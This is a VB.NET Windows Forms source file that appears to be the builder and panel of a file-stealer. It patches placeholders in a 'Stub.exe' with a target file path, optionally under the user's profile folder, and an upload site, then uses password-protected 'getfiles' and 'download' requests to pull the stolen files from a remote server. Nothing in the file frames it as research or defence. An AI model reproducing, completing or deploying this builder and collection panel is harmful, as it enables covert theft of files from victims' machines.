Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports System.Text
Public Class Form1

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try

            Dim NewDir As New SaveFileDialog

            NewDir.Filter = "Executables (*.exe)|*.exe"

            If NewDir.ShowDialog = Windows.Forms.DialogResult.OK Then
                Dim Stub As AssemblyDefinition = AssemblyDefinition.ReadAssembly("Stub.exe")
                For Each G In Stub.MainModule.GetTypes

                    For Each MEE In G.Methods

                        If MEE.Name = "Form1_Load" Then

                            Dim EMU As IEnumerator(Of Instruction) = Nothing

                            EMU = MEE.Body.Instructions.GetEnumerator

                            Do While EMU.MoveNext

                                Dim ISS As Instruction = EMU.Current

                                If ISS.OpCode.Code = Code.Ldstr Then

                                    Dim ST As String = ISS.Operand.ToString

                                    If ST = "%control%" Then
                                        If CheckBox1.Checked = True Then
                                            ISS.Operand = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\"
                                        End If
                                    End If

                                    If ST = "%control%" Then
                                        If CheckBox1.Checked = False Then
                                            ISS.Operand = ""
                                        End If
                                    End If

                                    If ST = "%filepath%" Then
                                        ISS.Operand = filepath.Text
                                        Continue Do
                                    End If


                                    If ST = "%uploadsite%" Then
                                        ISS.Operand = link.Text
                                    End If
                                    Continue Do




                                End If


                            Loop

                        End If

                    Next
                Next
                Stub.Write(NewDir.FileName)
                MsgBox(NewDir.FileName)
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        OpenFileDialog1.ShowDialog()
        filepath.Text = OpenFileDialog1.FileName
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click

        Dim client As New Net.WebClient
        client.Encoding = Encoding.UTF8
        Dim getfiles As String = client.DownloadString(actions.Text + "?action=getfiles&password=" + password.Text)
        Dim getfiles2 As String() = Split(getfiles, "|")
        For Each filename In getfiles2

            Files.Items.Add(filename)

        Next
        Files.Items.Remove("")
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        My.Computer.Network.DownloadFile(actions.Text + "?action=download&name=" + Convert.ToString(Files.SelectedItem) + "&password=" + password.Text, My.Computer.FileSystem.CurrentDirectory + "/downloaded_files/" + Convert.ToString(Files.SelectedItem))

    End Sub
End Class


